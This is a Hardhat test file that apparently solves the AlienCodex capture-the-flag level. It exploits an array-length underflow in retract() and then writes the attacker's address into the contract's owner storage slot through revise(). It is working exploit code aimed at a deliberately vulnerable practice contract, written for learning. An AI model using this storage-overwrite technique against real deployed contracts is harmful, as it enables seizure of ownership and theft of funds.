import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

describe("ALienCodex Hack", async () => {
  async function deployAlienCodexFixture() {
    const [deployer, attacker] = await ethers.getSigners();
    const attackerAddress = attacker.address;
    const AlienCodexFactory = await ethers.getContractFactory("AlienCodexFactory");
    const factory = await AlienCodexFactory.connect(deployer).deploy();
    await factory.deployed();

    // We cannot get the return value of the state-changing function off-chain.
    // Simulate on-chain execution of the createInstance() to get the return value (the address of the deployed instance).
    const alienCodexAddress = await factory.connect(deployer).callStatic.createInstance(attackerAddress);

    // Deploy instance of level
    const tx = await factory.connect(attacker).createInstance(attackerAddress);
    await tx.wait(1);

    const alienCodex = await ethers.getContractAt("AlienCodex", alienCodexAddress);
    return { attacker, factory, alienCodex };
  }

  it("Should claim the ownership of AlienCodex contract", async () => {
    const { attacker, factory, alienCodex } = await loadFixture(deployAlienCodexFixture);
    const attackerAddress = await attacker.getAddress();

    // Set contact to true so that it can pass the modifier
    let tx = await alienCodex.makeContact();
    await tx.wait(1);

    // calling retract(), we get an array of length 2^256 -1 i.e.
    // this expands the size of array to cover all the storage slots
    // all the storage slots now can be accessed by array.
    tx = await alienCodex.retract();
    await tx.wait(1);

    // Find the offset of owner variable in the array
    // Find array index which corresponds to the owner storage slot
    // calculate the slot from which the actual array starts
    // keccak256(slot)
    const codexSlotInHexPadded = ethers.utils.keccak256(ethers.utils.hexZeroPad("0x01", 32));
    const codexBeginLocation = BigNumber.from(codexSlotInHexPadded);
    // The index of owner in codex array is calculated as
    // 2^256 (array length) - owner slot
    const ownerOffset = BigNumber.from(2).pow(256).sub(codexBeginLocation);

    // set attacker as the owner
    const zeroPaddedAddress = ethers.utils.hexZeroPad(attackerAddress, 32);
    tx = await alienCodex.revise(ownerOffset, zeroPaddedAddress);
    await tx.wait(1);

    const owner = await alienCodex.owner();
    expect(owner).to.be.equal(attackerAddress, "Failed To Set The Attacker As New Owner");

    // Use callStatic to simulate transaction on chain to get return value
    const success = await factory.callStatic.validateInstance(alienCodex.address, attackerAddress);
    expect(success).to.be.eq(true, "Failed to validate the instance!!!");
  });
});
